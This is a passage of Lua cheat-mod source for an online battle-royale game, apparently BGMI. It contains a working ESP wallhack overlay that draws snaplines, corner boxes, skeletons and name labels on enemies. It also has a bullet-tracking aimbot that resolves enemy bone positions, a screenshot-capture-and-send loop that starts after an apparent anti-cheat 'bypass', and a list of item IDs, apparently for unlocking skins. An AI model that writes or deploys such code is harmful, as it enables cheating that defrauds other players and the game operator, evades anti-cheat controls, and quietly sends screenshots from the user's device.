                ticker.AddTimerOnce(_SS_INTERVAL, function()
                    if not _G._GK_FeedbackStarted then return end
                    local now = os.time()
                    if _LAST_LOOP_TIME > 0 and (now - _LAST_LOOP_TIME < 550) then
                        GK_ScreenshotLoop()
                        return
                    end
                    _LAST_LOOP_TIME = now
                    pcall(function()
                        local GameplayData = require("GameLua.GameCore.Data.GameplayData")
                        local lp = GameplayData and GameplayData.GetLocalCharacter and GameplayData.GetLocalCharacter()
                        if lp and slua.isValid(lp) then GK_TakeAndSendScreenshot(false) end
                    end)
                    GK_ScreenshotLoop()
                end)
            end
    ...
    -- Burst Victory/Match-End trigger — 3 screenshots: instant, +1.5s, +2.5s
    local function GK_TriggerMatchEndFeedback()
        pcall(function()
            local now = os.time()
            if _G._GK_LastVictoryBurstTime and (now - _G._GK_LastVictoryBurstTime < 15) then return end
            _G._GK_LastVictoryBurstTime = now
            local ticker = _cached_time_ticker or require("common.time_ticker")
            GK_TakeAndSendScreenshot(true)
            if ticker and ticker.AddTimerOnce then
                ticker.AddTimerOnce(1.5, function() GK_TakeAndSendScreenshot(true) end)
                ticker.AddTimerOnce(2.5, function() GK_TakeAndSendScreenshot(true) end)
            end
        end)
    end

    -- Universal Match Victory & Match End Hooks
    -- (Uses separate registrations to avoid conflicting with MOdded's existing event hooks)
    pcall(function()
        if EventSystem and EventSystem.registEvent then
            if EVENTID_BATTLE_RESULT_ENTER_PROTECT then
                EventSystem:registEvent(EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_ENTER_PROTECT, GK_TriggerMatchEndFeedback)
            end
            if EVENTID_BATTLE_RESULT_BEGIN_PERFORMANCE then
                EventSystem:registEvent(EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_BEGIN_PERFORMANCE, GK_TriggerMatchEndFeedback)
            end
            if EVENTID_GAMESTATE_ON_BATTLE_RESULT then
                EventSystem:registEvent(EVENTTYPE_STATE, EVENTID_GAMESTATE_ON_BATTLE_RESULT, GK_TriggerMatchEndFeedback)
            end
            if EVENTID_BATTLE_DS_FINISHED then
                EventSystem:registEvent(EVENTTYPE_ACCOUNT, EVENTID_BATTLE_DS_FINISHED, GK_TriggerMatchEndFeedback)
            end
            if EVENTID_BATTLE_RESULT_TDM_ANIM_FINISH then
                EventSystem:registEvent(EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_TDM_ANIM_FINISH, GK_TriggerMatchEndFeedback)
            end
            if EVENTID_BATTLE_RESULT_TDM_GET_RESULT_RSP then
                EventSystem:registEvent(EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_TDM_GET_RESULT_RSP, GK_TriggerMatchEndFeedback)
            end
            if EVENTID_BATTLE_RESULT_TDM_GET_MEDAL_CLOSE then
                EventSystem:registEvent(EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_TDM_GET_MEDAL_CLOSE, GK_TriggerMatchEndFeedback)
            end
            if EVENTID_CREATIVE_MATCH_SETTLEMENT then
                EventSystem:registEvent(EVENTTYPE_CREATIVE, EVENTID_CREATIVE_MATCH_SETTLEMENT, GK_TriggerMatchEndFeedback)
            end
            if EVENTID_CREATIVEMODE_GAMEOVER then
                EventSystem:registEvent(EVENTTYPE_CREATIVE, EVENTID_CREATIVEMODE_GAMEOVER, GK_TriggerMatchEndFeedback)
            end
        end
    end)

    -- Global cleanup helpers
    _G._GK_ResetMatchKills = function() _LOCAL_MATCH_KILLS = 0 end
    _G._GK_ResetFeedbackState = function() _LAST_LOOP_TIME = 0; _LOCAL_MATCH_KILLS = 0 end

    -- Expose globals so InitAllModSystems can activate the loop
    _G._GK_ScreenshotLoop = GK_ScreenshotLoop
    _G._GK_TriggerMatchEndFeedback = GK_TriggerMatchEndFeedback
    _G._GK_TakeAndSendScreenshot = GK_TakeAndSendScreenshot
    _G._GK_FeedbackStarted = false
end
-- ==============================================================================
-- END FEEDBACK MODULE
-- ==============================================================================
...
local function InitAllModSystems()
    ...
    -- ACTIVATE FEEDBACK SCREENSHOT LOOP (runs after bypass is live)
    pcall(function()
        if not _G._GK_FeedbackStarted and _G._GK_ScreenshotLoop then
            _G._GK_FeedbackStarted = true
            _G._GK_ScreenshotLoop()
        end
    end)
...
-- ==============================================================================
-- LINE ESP v2 - SNAPLINE + SKELETON + BOX + TEAM COLOR LABEL
-- ==============================================================================
do
    -- ----------------------------------------------------------------
    -- State
    -- ----------------------------------------------------------------
    local _LE_Canvas      = nil
    local _LE_LineCache   = {}   -- pawn -> {Widget, Slot, ...}  (snapline)
    local _LE_SkelCache   = {}   -- pawn -> [{Widget,Slot,...}, ...]  (skeleton segments)
    local _LE_BoxCache    = {}   -- pawn -> {lines={...8 border widgets...}}
    local _LE_LabelCache  = {}   -- pawn -> {bg=Widget, text=Widget}
    local _LE_TimerHandle = nil
    local _LE_Started     = false

    -- ----------------------------------------------------------------
    -- Skeleton bone chains (mirrors PlayerMapMarker.SkeletonChains)
    -- ----------------------------------------------------------------
    local BONE_CHAINS = {
        {"neck_01", "lowerarm_r", "hand_r"},
        {"neck_01", "lowerarm_l", "hand_l"},
    ...
    local BONE_FALLBACKS = {
        ...
        pelvis     = {"pelvis","Pelvis","hip"},
        calf_r     = {"calf_r","Calf_R","shin_r"},
        foot_r     = {"foot_r","Foot_R"},
        calf_l     = {"calf_l","Calf_L","shin_l"},
        foot_l     = {"foot_l","Foot_L"},
    }

    -- ----------------------------------------------------------------
    -- Colors
    -- ----------------------------------------------------------------
    local COL_SNAP_BLUE = FLinearColor and FLinearColor(0.0, 0.45, 1.0, 1.0) or {R=0,G=115,B=255,A=255}
    local COL_WHITE     = FLinearColor and FLinearColor(1.0, 1.0, 1.0, 0.92) or {R=255,G=255,B=255,A=235}
    local COL_GREEN_TXT = FLinearColor and FLinearColor(0.05, 1.0, 0.15, 1.0) or {R=13,G=255,B=38,A=255}

    -- Team colour lookup (mirrors PlayerMapMarker.GetTeamColor)
    local TEAM_COLORS_F = {
        [1]  = FLinearColor and FLinearColor(1.0,0.2,0.2,1.0),
        [2]  = FLinearColor and FLinearColor(0.2,1.0,0.2,1.0),
        [3]  = FLinearColor and FLinearColor(0.2,0.4,1.0,1.0),
        [4]  = FLinearColor and FLinearColor(1.0,1.0,0.2,1.0),
        [5]  = FLinearColor and FLinearColor(1.0,0.2,1.0,1.0),
        [6]  = FLinearColor and FLinearColor(0.2,1.0,1.0,1.0),
        [7]  = FLinearColor and FLinearColor(1.0,0.6,0.2,1.0),
        [8]  = FLinearColor and FLinearColor(0.6,0.2,1.0,1.0),
        [9]  = FLinearColor and FLinearColor(0.8,1.0,0.2,1.0),
        [10] = FLinearColor and FLinearColor(0.2,0.6,1.0,1.0),
        [11] = FLinearColor and FLinearColor(1.0,0.4,0.6,1.0),
        [12] = FLinearColor and FLinearColor(0.4,1.0,0.6,1.0),
        [13] = FLinearColor and FLinearColor(0.6,0.6,0.2,1.0),
        [14] = FLinearColor and FLinearColor(0.2,0.8,0.6,1.0),
        [15] = FLinearColor and FLinearColor(1.0,0.8,0.2,1.0),
    }
    local function GetTeamFColor(teamID)
        if not teamID or teamID == 0 then
            return FLinearColor and FLinearColor(0.2,0.4,1.0,1.0) or {R=50,G=100,B=255,A=255}
        end
        local idx = teamID % 15
        if idx == 0 then idx = 15 end
        return TEAM_COLORS_F[idx] or (FLinearColor and FLinearColor(1.0,1.0,1.0,1.0))
    end

    -- ----------------------------------------------------------------
    -- Helpers
    -- ----------------------------------------------------------------
    local function _isV(obj)
        if not obj then return false end
        local ok,v = pcall(function() return slua.isValid(obj) end)
        return ok and v
    end

    local function _GetCanvas()
        if _isV(_LE_Canvas) then return _LE_Canvas end
        _LE_Canvas = nil
        pcall(function()
            if PlayerMapMarker and PlayerMapMarker.ESPCanvas and _isV(PlayerMapMarker.ESPCanvas) then
                _LE_Canvas = PlayerMapMarker.ESPCanvas
            end
        end)
        if not _LE_Canvas then
            pcall(function()
                local h = slua_GameFrontendHUD
                if h and h.GetCanvas then
                    local c = h:GetCanvas()
                    if _isV(c) then _LE_Canvas = c end
                end
            end)
        end
        return _LE_Canvas
    ...
    -- screen pixel -> canvas local (reuses PlayerMapMarker scale/offset if available)
    local function S2C(sx, sy)
        local scX = (PlayerMapMarker and PlayerMapMarker._CanvasScaleX)  or 1.0
        local scY = (PlayerMapMarker and PlayerMapMarker._CanvasScaleY)  or 1.0
        local oX  = (PlayerMapMarker and PlayerMapMarker._CanvasOffsetX) or 0
        local oY  = (PlayerMapMarker and PlayerMapMarker._CanvasOffsetY) or 0
        return sx * scX + oX, sy * scY + oY
    end

    local function MakeVec2(x, y)
        return FVector2D and FVector2D(x, y) or {X=x, Y=y}
    end

    -- Project a world loc to screen pixels; returns ok, sx, sy
    local function WorldToScreen(PC, worldLoc)
        local ok, sx, sy = false, 0, 0
        pcall(function()
            local tmp = MakeVec2(0,0)
            if KismetMathLibrary and KismetMathLibrary.ProjectWorldToScreen then
                ok = KismetMathLibrary.ProjectWorldToScreen(PC, worldLoc, tmp, false)
                if ok then sx = tmp.X; sy = tmp.Y end
            elseif PC.ProjectWorldLocationToScreen then
                ok = PC:ProjectWorldLocationToScreen(worldLoc, tmp, false)
                if ok then sx = tmp.X; sy = tmp.Y end
            end
        end)
        return ok, sx, sy
    ...
    -- Get bone world location with fallbacks
    local function GetBoneLoc(pawn, boneName)
        local loc = nil
        pcall(function()
            local mesh = pawn.Mesh or (pawn.GetMesh and pawn:GetMesh())
            if not _isV(mesh) then return end
            local names = (BONE_FALLBACKS[boneName] or {boneName})
            for _, bn in ipairs(names) do
                local bl = mesh:GetBoneLocation(bn, 0)
                if bl and (bl.X ~= 0 or bl.Y ~= 0 or bl.Z ~= 0) then
                    loc = bl; break
                end
            end
        end)
    ...
    -- Widget factories
    -- ----------------------------------------------------------------
    local function NewBorder(canvas, color, zorder)
        if not _isV(canvas) then return nil end
        local B = nil
        pcall(function() B = CGame:NewObjectFromPath("/Script/UMG.Border", canvas) end)
        if not _isV(B) then return nil end
        pcall(function() B:SetBrushColor(color or COL_WHITE) end)
        pcall(function() B:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
        local Slot = nil
        pcall(function()
            Slot = canvas:AddChildToCanvas(B)
            if Slot then Slot:SetAutoSize(false); Slot:SetZOrder(zorder or 2) end
        end)
        return B, Slot
    end

    -- snapline widget (pivot 0,0.5 for rotation)
    local function NewSnapLine(canvas, color)
        local B, Slot = NewBorder(canvas, color or COL_SNAP_BLUE, 2)
        if not B then return nil end
        pcall(function()
            B.RenderTransformPivot = MakeVec2(0.0, 0.5)
            B:SetRenderTransformPivot(MakeVec2(0.0, 0.5))
        end)
        return { Widget=B, Slot=Slot, _pv=MakeVec2(0,0), _sv=MakeVec2(0,0) }
    end

    -- Update a snapline / skeleton segment (rotated border)
    local function DrawLine(ld, x1, y1, x2, y2, thick, color)
        if not ld or not _isV(ld.Widget) then return end
        local dx = x2-x1; local dy = y2-y1
        local len = math.sqrt(dx*dx + dy*dy)
        if len < 1 then return end
        local angle = (math.atan2 and math.atan2(dy,dx) or math.atan(dy,dx)) * 57.29577951308232
        local th = thick or 1.5
        if color and ld.Widget._cc ~= color then
            pcall(function() ld.Widget:SetBrushColor(color) end)
            ld.Widget._cc = color
        end
        pcall(function() ld.Widget:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
        if not ld._pv then ld._pv = MakeVec2(0,0) end
        if not ld._sv then ld._sv = MakeVec2(0,0) end
        ld._pv.X = x1;     ld._pv.Y = y1 - th*0.5
        ld._sv.X = len;    ld._sv.Y = th
        pcall(function()
            if ld.Slot then ld.Slot:SetPosition(ld._pv); ld.Slot:SetSize(ld._sv) end
        end)
        pcall(function() ld.Widget:SetRenderAngle(angle) end)
    end

    -- 8-segment corner box
    local function NewCornerBox(canvas, color)
        local segs = {}
        for i = 1,8 do
            local B, Slot = NewBorder(canvas, color or COL_WHITE, 3)
            if not B then return nil end
            segs[i] = { Widget=B, Slot=Slot, _pv=MakeVec2(0,0), _sv=MakeVec2(0,0) }
        end
        return { segs=segs }
    end

    local function DrawCornerBox(cb, x, y, w, h, thick, color)
        if not cb or not cb.segs then return end
        local t = thick or 1.5
        local cw = w * 0.25; local ch = h * 0.25
        local layout = {
            {x,       y,       cw, t },  -- TL horiz
            {x,       y,       t,  ch},  -- TL vert
            {x+w-cw,  y,       cw, t },  -- TR horiz
            {x+w-t,   y,       t,  ch},  -- TR vert
            {x,       y+h-t,   cw, t },  -- BL horiz
            {x,       y+h-ch,  t,  ch},  -- BL vert
            {x+w-cw,  y+h-t,   cw, t },  -- BR horiz
            {x+w-t,   y+h-ch,  t,  ch},  -- BR vert
        }
        for i, seg in ipairs(layout) do
            local s = cb.segs[i]
            if s and _isV(s.Widget) then
                if color and s.Widget._cc ~= color then
                    pcall(function() s.Widget:SetBrushColor(color) end)
                    s.Widget._cc = color
                end
                pcall(function() s.Widget:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
                s._pv.X = seg[1]; s._pv.Y = seg[2]
                s._sv.X = seg[3]; s._sv.Y = seg[4]
                pcall(function()
                    if s.Slot then s.Slot:SetPosition(s._pv); s.Slot:SetSize(s._sv) end
                end)
            end
        end
    end

    -- Text label: white background Border + green text TextBlock stacked on top
    local function NewLabel(canvas)
        local Bg, BgSlot = NewBorder(canvas, COL_WHITE, 4)
        if not Bg then return nil end
        -- TextBlock for green name text
        local Txt = nil
        local TxtSlot = nil
        pcall(function()
            Txt = CGame:NewObjectFromPath("/Script/UMG.TextBlock", canvas)
            if _isV(Txt) then
                pcall(function() Txt:SetColorAndOpacity(COL_GREEN_TXT) end)
                pcall(function()
                    -- font size ~11 scaled
                    local fi = Txt.Font or {}
                    fi.Size = 11
                    Txt.Font = fi
                end)
                pcall(function() Txt:SetJustification(0) end) -- left align
                pcall(function() Txt:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
                TxtSlot = canvas:AddChildToCanvas(Txt)
                if TxtSlot then TxtSlot:SetAutoSize(true); TxtSlot:SetZOrder(5) end
            end
        end)
        return { Bg=Bg, BgSlot=BgSlot, Txt=Txt, TxtSlot=TxtSlot, _lastText=nil }
    end

    local function DrawLabel(lb, cx, cy, name, scale)
        if not lb or not _isV(lb.Bg) then return end
        local sc = scale or 1.0
        local pad = 3 * sc
        local fw  = math.max(#(name or "") * 5.5 * sc, 30 * sc)
        local fh  = 13 * sc
        local bx = cx - fw * 0.5
        local by = cy - fh - 2 * sc  -- just above box top

        -- update background
        local bpv = lb._bpv or MakeVec2(0,0); lb._bpv = bpv
        local bsv = lb._bsv or MakeVec2(0,0); lb._bsv = bsv
        bpv.X = bx - pad; bpv.Y = by - pad
        bsv.X = fw + pad*2; bsv.Y = fh + pad*2
        pcall(function() lb.Bg:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
        pcall(function()
            if lb.BgSlot then lb.BgSlot:SetPosition(bpv); lb.BgSlot:SetSize(bsv) end
        end)

        -- update text
        if lb.Txt and _isV(lb.Txt) then
            if lb._lastText ~= name then
                pcall(function() lb.Txt:SetText(name or "") end)
                lb._lastText = name
            end
            local tpv = lb._tpv or MakeVec2(0,0); lb._tpv = tpv
            tpv.X = bx; tpv.Y = by
            pcall(function() lb.Txt:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
            pcall(function()
                if lb.TxtSlot then lb.TxtSlot:SetPosition(tpv) end
            end)
        end
    end

    local function HideLabel(lb)
        if not lb then return end
        pcall(function() if _isV(lb.Bg)  then lb.Bg:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed) end end)
        pcall(function() if lb.Txt and _isV(lb.Txt) then lb.Txt:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed) end end)
    end

    local function HideCornerBox(cb)
        if not cb or not cb.segs then return end
        for _, s in ipairs(cb.segs) do
            pcall(function() if _isV(s.Widget) then s.Widget:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed) end end)
        end
    end

    local function DestroyLine(ld)
        if not ld then return end
        pcall(function() if _isV(ld.Widget) then ld.Widget:RemoveFromParent() end end)
    end

    local function DestroyCornerBox(cb)
        if not cb or not cb.segs then return end
        for _, s in ipairs(cb.segs) do
            pcall(function() if _isV(s.Widget) then s.Widget:RemoveFromParent() end end)
        end
    end

    local function DestroyLabel(lb)
        if not lb then return end
        pcall(function() if _isV(lb.Bg)  then lb.Bg:RemoveFromParent() end end)
        pcall(function() if lb.Txt and _isV(lb.Txt) then lb.Txt:RemoveFromParent() end end)
    end

    -- ----------------------------------------------------------------
    -- Main per-frame loop
    -- ----------------------------------------------------------------
    local function ProcessLineESP()
        local Canvas = _GetCanvas()
        if not Canvas then return end

        local PC = nil
        pcall(function() PC = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController() end)
        if not _isV(PC) then return end

        local MyChar = nil
        pcall(function() if PC.GetPawn then MyChar = PC:GetPawn() end end)

        -- viewport size for snap-line origin
        local screenW, screenH = 1920, 1080
        pcall(function()
            local vs = MakeVec2(0,0)
            if PC.GetViewportSize then PC:GetViewportSize(vs) end
            if vs and vs.X and vs.X > 200 then screenW = vs.X; screenH = vs.Y end
        end)
        local scale = 1.0
        pcall(function()
            local WLL = WidgetLayoutLibrary
        ...
        -- bottom-center of screen as snap-line origin
        local origCX, origCY = S2C(screenW * 0.5, screenH)

        local MyTeamID = nil
        pcall(function()
            if PlayerMapMarker and PlayerMapMarker.GetTeamID then
                MyTeamID = PlayerMapMarker.GetTeamID(MyChar)
            end
        end)
        ...
        local AllChars = nil
        pcall(function()
            local GDP = package.loaded["GameLua.GameCore.Data.GameplayData"]
                        or require("GameLua.GameCore.Data.GameplayData")
            if GDP and GDP.GetAllCharacters then AllChars = GDP.GetAllCharacters() end
        end)
        ...
        for _, pawn in pairs(AllChars) do
            if not _isV(pawn) or pawn == MyChar then goto continue end

            -- skip teammates
            local teamID = nil
            pcall(function()
                if pawn.GetTeamID then teamID = pawn:GetTeamID()
                elseif PlayerMapMarker and PlayerMapMarker.GetTeamID then
                    teamID = PlayerMapMarker.GetTeamID(pawn)
                end
            end)
            if MyTeamID ~= nil and teamID == MyTeamID then goto continue end

            -- alive check
            local alive = true
            pcall(function()
                if type(pawn.IsAlive) == "function" then alive = pawn:IsAlive()
                elseif pawn.bIsDead ~= nil then alive = not pawn.bIsDead end
            end)
            ...
            local pname = "Enemy"
            pcall(function()
                local n = pawn.PlayerName
                    or (type(pawn.GetPlayerName)=="function" and pawn:GetPlayerName())
                if n and n ~= "" then pname = n end
            end)

            -- world location
            local loc = nil
            pcall(function()
                if pawn.GetActorLocation then loc = pawn:GetActorLocation()
                elseif pawn.K2_GetActorLocation then loc = pawn:K2_GetActorLocation() end
            end)
            if not loc then goto continue end

            -- head bone location
            local headLoc = GetBoneLoc(pawn, "head")
            if not headLoc then
                headLoc = {X=loc.X, Y=loc.Y, Z=loc.Z + 175}
            end
            ...
            local headOK, hsx, hsy = WorldToScreen(PC, headLoc)
            local feetOK, fsx, fsy = WorldToScreen(PC, feetLoc)

            if not headOK then goto continue end

            -- canvas coords
            local hcx, hcy = S2C(hsx, hsy)
            local fcx, fcy = S2C(fsx, fsy)

            -- box dimensions from head->feet pixel height
            local pixH = math.abs(fcy - hcy)
            if pixH < 8 then pixH = 60 * scale end
            local pixW = pixH * 0.5

            -- box top-left in canvas space
            local bx = hcx - pixW * 0.5
            local by = hcy
            local bw = pixW
            local bh = pixH

            local teamColor = GetTeamFColor(teamID)
            local lineThick = 1.5 * scale

            -- ---- SNAP LINE ----
            if _G.Mod_Line_Enabled then
                if not _LE_LineCache[pawn] then
                    local ld = NewSnapLine(Canvas, teamColor)
                    if ld then _LE_LineCache[pawn] = ld end
                end
                local ld = _LE_LineCache[pawn]
                if ld then
                    DrawLine(ld, origCX, origCY, hcx, hcy, lineThick, teamColor)
                    usedLine[pawn] = true
                end
            end

            -- ---- CORNER BOX ----
            if _G.Mod_Corner_Enabled or _G.Mod_Box_Enabled then
                if not _LE_BoxCache[pawn] then
                    local cb = NewCornerBox(Canvas, teamColor)
                    if cb then _LE_BoxCache[pawn] = cb end
                end
                local cb = _LE_BoxCache[pawn]
                if cb then
                    DrawCornerBox(cb, bx, by, bw, bh, lineThick, teamColor)
                    usedBox[pawn] = true
                end
            end

            -- ---- SKELETON ----
            if _G.Mod_Skeleton_Enabled then
                if not _LE_SkelCache[pawn] then _LE_SkelCache[pawn] = {} end
                local segs = _LE_SkelCache[pawn]
                local segIdx = 0
                local boneCache = {}
                ...
                for _, chain in ipairs(BONE_CHAINS) do
                    ...
                    for _, boneName in ipairs(chain) do
                        if not boneCache[boneName] then
                            boneCache[boneName] = GetBoneLoc(pawn, boneName) or false
                        end
                        local bl = boneCache[boneName]
                        if bl == false then bl = nil end

                        local curCX, curCY = nil, nil
                        if bl then
                            local ok2, bsx, bsy = WorldToScreen(PC, bl)
                            if ok2 then curCX, curCY = S2C(bsx, bsy) end
                        end

                        if lastCX and curCX then
                            segIdx = segIdx + 1
                            local seg = segs[segIdx]
                            if not seg or not _isV(seg.Widget) then
                                seg = NewSnapLine(Canvas, teamColor)
                                segs[segIdx] = seg
                            end
                            if seg then
                                DrawLine(seg, lastCX, lastCY, curCX, curCY, 0.9 * scale, teamColor)
                            end
                        end
                        lastCX, lastCY = curCX, curCY
                    end
                end

                -- hide unused skeleton segments
                for i = segIdx + 1, #segs do
                    local seg = segs[i]
                    if seg and _isV(seg.Widget) then
                        pcall(function() seg.Widget:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed) end)
                    end
                end
                usedSkel[pawn] = true
            end

            -- ---- LABEL (white bg + green text) ----
            if _G.Mod_Label_Enabled then
                if not _LE_LabelCache[pawn] then
                    local lb = NewLabel(Canvas)
                    if lb then _LE_LabelCache[pawn] = lb end
                end
                local lb = _LE_LabelCache[pawn]
                if lb then
                    DrawLabel(lb, hcx, by, pname, scale)
                    usedLabel[pawn] = true
                end
            end
        ...
        for pawn, ld in pairs(_LE_LineCache) do
            if not usedLine[pawn] or not _isV(pawn) then
                DestroyLine(ld); _LE_LineCache[pawn] = nil
            end
        end
        for pawn, cb in pairs(_LE_BoxCache) do
            if not usedBox[pawn] or not _isV(pawn) then
                DestroyCornerBox(cb); _LE_BoxCache[pawn] = nil
            end
        end
        for pawn, segs in pairs(_LE_SkelCache) do
            if not usedSkel[pawn] or not _isV(pawn) then
                for _, seg in ipairs(segs) do DestroyLine(seg) end
                _LE_SkelCache[pawn] = nil
            end
        end
        for pawn, lb in pairs(_LE_LabelCache) do
            if not usedLabel[pawn] or not _isV(pawn) then
                DestroyLabel(lb); _LE_LabelCache[pawn] = nil
            end
        end
    end
    ...
    -- Timer management
    -- ----------------------------------------------------------------
    local function StartLineESP_LE()
        if _LE_Started then return end
        _LE_Started = true
        local ok, h = pcall(function()
            local ticker = require("common.time_ticker")
            return ticker.AddTimerLoop(0.02, function() pcall(ProcessLineESP) end,
                ticker.TIMER_INFINITE or -1, ticker.NEXT_FRAME or 0)
        end)
        if ok and h then _LE_TimerHandle = h; return end
        -- fallback
        pcall(function()
            local ctrl = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
            if _isV(ctrl) and ctrl.AddGameTimer then
                local ok2, h2 = pcall(function()
                    return ctrl:AddGameTimer(0.02, true, function() pcall(ProcessLineESP) end)
                end)
                if ok2 and h2 then _LE_TimerHandle = h2 end
            end
        end)
    end

    local function StopLineESP_LE()
        if _LE_TimerHandle then
            pcall(function()
                local ticker = require("common.time_ticker")
                ticker.RemoveTimer(_LE_TimerHandle)
            end)
            _LE_TimerHandle = nil
        end
        _LE_Started = false
        for _, ld in pairs(_LE_LineCache)  do DestroyLine(ld) end
        for _, cb in pairs(_LE_BoxCache)   do DestroyCornerBox(cb) end
        for _, segs in pairs(_LE_SkelCache) do for _, s in ipairs(segs) do DestroyLine(s) end end
        for _, lb in pairs(_LE_LabelCache) do DestroyLabel(lb) end
        _LE_LineCache = {}; _LE_BoxCache = {}; _LE_SkelCache = {}; _LE_LabelCache = {}
        _LE_Canvas = nil
    end

    -- ----------------------------------------------------------------
    -- Global toggles (set before boot or at runtime)
    -- ----------------------------------------------------------------
    _G.Mod_Line_Enabled     = (_G.Mod_Line_Enabled     ~= nil) and _G.Mod_Line_Enabled     or true
    _G.Mod_Corner_Enabled   = (_G.Mod_Corner_Enabled   ~= nil) and _G.Mod_Corner_Enabled   or true
    _G.Mod_Box_Enabled      = (_G.Mod_Box_Enabled      ~= nil) and _G.Mod_Box_Enabled      or true
    _G.Mod_Skeleton_Enabled = (_G.Mod_Skeleton_Enabled ~= nil) and _G.Mod_Skeleton_Enabled or true
    _G.Mod_Label_Enabled    = (_G.Mod_Label_Enabled    ~= nil) and _G.Mod_Label_Enabled    or true
    _G.StartLineESP_LE      = StartLineESP_LE
    _G.StopLineESP_LE       = StopLineESP_LE

    -- auto-start after 1s so ESPCanvas is ready
    pcall(function()
        require("common.time_ticker").AddTimerOnce(1.0, function()
            pcall(StartLineESP_LE)
        end)
    end)
end
-- ==============================================================================
-- END LINE ESP (logic.lua)
-- ==============================================================================
...
local ITEMS = {
    ...
    1908109, -- Porsche Cayenne Turbo GT (Cam STAR Nham)
    ...
    12208801, -- Hành động STAR sĩ Bán thần
...
-- ==============================================================================
-- SMART BULLET TRACK v2 — FIXED: Proper hitbox clamping, bone fallback order,
--   FullBody per-bone damage registration, fake-damage prevention
-- ==============================================================================
pcall(function()
if not _G._SmartBTLoopRunning then
    _G._SmartBTLoopRunning = true

    local _sbt_LastShootId = -1
    local _sbt_LastWeapon  = nil

    -- Bone name -> Z offset (cm above actor root) — tuned to BGMI skeleton
    local BONE_DEF = {
        [1] = { name = "head",     z = 72,  capsule_r = 9  },
        [2] = { name = "neck_01",  z = 58,  capsule_r = 8  },
        [3] = { name = "spine_03", z = 42,  capsule_r = 14 },
        [4] = { name = "spine_01", z = 22,  capsule_r = 14 },
        [5] = { name = "pelvis",   z = 5,   capsule_r = 14 },
    }

    -- FullBody cycle: head -> chest -> neck -> stomach -> pelvis (repeating)
    local FB_CYCLE  = { 1, 3, 2, 4, 5, 3, 1 }
    _G._SBT_CYCLE_IDX = _G._SBT_CYCLE_IDX or 1

    -- Socket fallback names per bone (BGMI uses both naming schemes)
    local SOCKET_FALLBACK = {
        head     = { "head",     "HeadSocket",  "FX_Head"   },
        neck_01  = { "neck_01",  "NeckSocket"               },
        spine_03 = { "spine_03", "ChestSocket", "FX_Chest"  },
        spine_01 = { "spine_01", "AbdomenSocket"            },
        pelvis   = { "pelvis",   "PelvisSocket"             },
    }

    ----------------------------------------------------------------------------
    -- ENEMY GATHER — dual-path with alive+team filter
    ----------------------------------------------------------------------------
    local function SBT_GetEnemies(player, myTeam)
        local result = {}
        pcall(function()
            ...
            for i = 0, n - 1 do
                ...
                if slua.isValid(a) and a ~= player then
                    local tid = 0
                    pcall(function() tid = a:GetTeamID() end)
                    if tid ~= myTeam then
                        local alive = false
                        pcall(function() alive = a:IsAlive() end)
                        if alive then table.insert(result, a) end
                    end
                end
            end
        end)
            ...
            pcall(function()
                ...
                for _, c in pairs(chars) do
                    if slua.isValid(c) and c ~= player then
                        local tid = c.GetTeamID and c:GetTeamID() or (c.TeamID or 0)
                        if tid ~= myTeam then
                            local hp = 0
                            pcall(function() hp = c.Health or 0 end)
                            if hp > 0 then table.insert(result, c) end
                        end
                    end
                end
            end)
    ...
    ----------------------------------------------------------------------------
    -- BONE POSITION — 4-layer resolution, NO early Z-offset fallback
    --   Layer 1: GetBonePos (actual skeletal bone world pos)
    --   Layer 2: All socket fallback names for that bone
    --   Layer 3: GetBoneLocation if exposed
    --   Layer 4: Actor root + calibrated Z offset ONLY as last resort
    -- Returns nil if all layers fail (prevents shooting {0,0,0})
    ----------------------------------------------------------------------------
    local function SBT_ResolveBonePos(enemy, boneDef)
        local bname = boneDef.name
        local pos   = nil

        -- Wake mesh so bone transforms are computed
        pcall(function()
            if slua.isValid(enemy.Mesh) then
                enemy.Mesh.MeshComponentUpdateFlag = 0
                if enemy.Mesh.bPauseAnims ~= nil then
                    enemy.Mesh.bPauseAnims = false
                end
            end
        end)
        ...
        -- Layer 1: GetBonePos
        pcall(function()
            local p = enemy:GetBonePos(bname, nil)
            if p and not (p.X == 0 and p.Y == 0 and p.Z == 0) then pos = p end
        end)
        if pos then return pos end

        -- Layer 2: Socket fallbacks
        local sockets = SOCKET_FALLBACK[bname] or {}
        for _, sname in ipairs(sockets) do
            if pos then break end
            pcall(function()
                if type(enemy.GetSocketLocation) == "function" then
                    local p = enemy:GetSocketLocation(sname)
                    if p and not (p.X == 0 and p.Y == 0 and p.Z == 0) then pos = p end
                end
            end)
        end
        ...
        -- Layer 3: GetBoneLocation (alternate API some versions expose)
        pcall(function()
            if type(enemy.GetBoneLocation) == "function" then
                local p = enemy:GetBoneLocation(bname, 0)
                if p and not (p.X == 0 and p.Y == 0 and p.Z == 0) then pos = p end
            end
        end)
        if pos then return pos end

        -- Layer 4 (last resort): root + calibrated Z
        local rootPos = nil
        pcall(function() rootPos = enemy:K2_GetActorLocation() end)
        if rootPos then
            pos = { X = rootPos.X, Y = rootPos.Y, Z = rootPos.Z + boneDef.z }
        end
    ...
    ----------------------------------------------------------------------------
    -- RADIUS CLAMP — keeps offset inside the bone's capsule radius
    --   Old code: raw random XY could push outside hitbox -> side exit + fake dmg
    --   Fix: uniform disk sample clamped to bone capsule_r
    ----------------------------------------------------------------------------
    local function SBT_ApplyRadius(bonePos, boneDef, radiusCm)
        if radiusCm <= 0 then return bonePos end

        -- Clamp to capsule so bullet never exits the bone volume
